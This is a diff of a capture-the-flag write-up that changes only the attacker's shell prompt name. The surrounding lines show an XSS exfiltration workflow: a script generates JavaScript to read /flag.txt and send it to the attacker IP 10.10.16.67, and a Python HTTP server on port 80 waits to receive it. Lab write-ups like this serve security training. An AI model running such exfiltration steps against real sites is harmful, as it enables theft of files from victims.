@@ -64,7 +64,7 @@ It says '<span style="color: rgb(224, 62, 45);">Thanks for your feedback! It wil
 We download and make it executable with `sudo chmod +x xss-extract.py` and run it :
 
 ```
-┌──(hax㉿HaxonKali)-[~/Scaricati]
+┌──(mdn0x㉿mdn0xKali)-[~/Scaricati]
 └─$ python3 xss-extract.py -h   
 usage: xss-extract.py [-h] -d DIRECTORY -i IP
 
@@ -85,7 +85,7 @@ options:
 So we have the syntax for our flag :
 
 ```
-┌──(hax㉿HaxonKali)-[~/Scaricati]
+┌──(mdn0x㉿mdn0xKali)-[~/Scaricati]
 └─$ python3 xss-extract.py -d /flag.txt -i 10.10.16.67
 JavaScript code has been written to script.js
 
@@ -94,7 +94,7 @@ JavaScript code has been written to script.js
 Now we can open our [Python](../../3%20-%20Tags/Programming%20Languages/Python.md) web [Server](../../3%20-%20Tags/Hacking%20Concepts/Server.md) :
 
 ```
-┌──(hax㉿HaxonKali)-[~/Scaricati]
+┌──(mdn0x㉿mdn0xKali)-[~/Scaricati]
 └─$ python3 -m http.server 80                         
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
